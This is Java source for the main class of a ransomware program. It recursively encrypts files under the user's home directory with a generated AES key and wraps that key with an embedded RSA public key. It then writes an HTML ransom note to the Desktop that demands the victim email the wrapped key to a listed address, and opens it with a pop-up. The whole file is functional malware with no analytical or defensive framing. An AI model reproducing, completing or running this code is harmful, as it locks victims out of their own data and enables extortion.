import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.FileWriter;
import java.security.KeyFactory;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

public class Main {
    private static final SecretKeySpec secretKey = AESFileEncryption.generateKey(256);
    private static Cipher cipher;
    public static void main(String[] args) {
        String desktopPath = System.getProperty("user.home") + "\\Desktop\\";
        File txtFile = new File(desktopPath + "IMPORTANT-重要.html");
        if(txtFile.exists())
            return;
        File file = new File(System.getProperty("user.home"));
        traverseDir(file);
        try{
            cipher = Cipher.getInstance("RSA");
            cipher.init(Cipher.ENCRYPT_MODE, KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(Base64.getDecoder().decode("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv4241kTF0oZbz2MFMraQWrl+ge+FjPuimK0524e9fkpu1hoRlqTvb+Ki4lBZ3We7J+KMNCDUR4D026sbgG6Bz4SVwvCBlxMo/L9qSwCHC0rXMkW7baEbMsTqjBFQTDXTImsiVMsHUxEirBhYXBJfAflS7Zi8WBEr1+H/j/SsNFA4UwnuDpjacU5pDzo28Z7IoQvZ+jN2fctQyan1QVR6hxVS3bbNsF7AZQKWC3nyWUzm+ZRLcPbeK0tdPyQtL9E2an5m2FYCEm2mJ883pqZbZKxD6/FVMrCTomFiFm4lbL+3KfyvXbD4s/gpXUBpaOto1LTDUl+gYS72f4zpZrkYQQIDAQAB")))); // 设置加密模式和密钥
            txtFile.createNewFile();
            FileWriter writer = new FileWriter(txtFile);
            writer.write("<head>\n" +
                    "    <title>Important-重要</title>\n" +
                    "    <script>\n" +
                    "        function copyText() {\n" +
                    "            var text = document.getElementById(\"text\").innerText;\n" +
                    "            var input = document.getElementById(\"input\");\n" +
                    "            input.value = text;\n" +
                    "            input.select();\n" +
                    "            document.execCommand(\"copy\");\n" +
                    "        }\n" +
                    "    </script>\n" +
                    "    <style>\n" +
                    "        .wrapper {position: relative;}\n" +
                    "        #input {\n" +
                    "            position:absolute;\n" +
                    "            top:-10000px;\n" +
                    "            opacity: 0;\n" +
                    "            z-inde:-10;\n" +
                    "        }\n" +
                    "    </style>\n" +
                    "</head>\n" +
                    "<body>\n" +
                    "    <h1 style=\"color: brown;\">Where is my files?</h1>\n" +
                    "    <h3>Your files have been encrypted by @html403 .</h3>\n" +
                    "    <h1 style=\"color: brown;\">How can I decrypt my files?</h1>\n" +
                    "    <h3>If you want to decrypt file, please send key to yf0xqzsd@duck.com ,</h3>\n" +
                    "    <h3>and we will send you a tool to decrypt your files.</h3>\n" +
                    "    <div class=\"wrapper\">\n" +
                    "        <p id=\"text\">Key: "+ encrypt() +"</p>\n" +
                    "        <input id=\"input\">\n" +
                    "        <button onclick=\"copyText()\">Copy key</button>\n" +
                    "    </div>\n" +
                    "\n" +
                    "</body>");
            writer.close();
            JOptionPane.showMessageDialog(null, "IT IMPORTANT TO SEE THE HTML FILE \" IMPORTANT-重要.html \" ON YOUR DESKTOP "  ,"IMPORTANT", JOptionPane.INFORMATION_MESSAGE);
            Desktop.getDesktop().open(txtFile);
        }catch (Exception ignore){}

    }
    public static String encrypt() throws Exception {
        assert secretKey != null;
        byte[] dataBytes = secretKey.getEncoded();
        byte[] encryptedBytes = cipher.doFinal(dataBytes);
        return Base64.getEncoder().encodeToString(encryptedBytes);
    }

    public static void traverseDir(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (final File file : files) {
                if (file.isDirectory() && AESFileEncryption.canEncryptPath(file))
                    traverseDir(file);
                else
                    new Thread(() -> {
                        if (AESFileEncryption.canEncryptFile(file) && !AESFileEncryption.isEncrypted(file, secretKey))
                            AESFileEncryption.encryptFile(file, secretKey);
                    }).start();
            }
        }
    }

}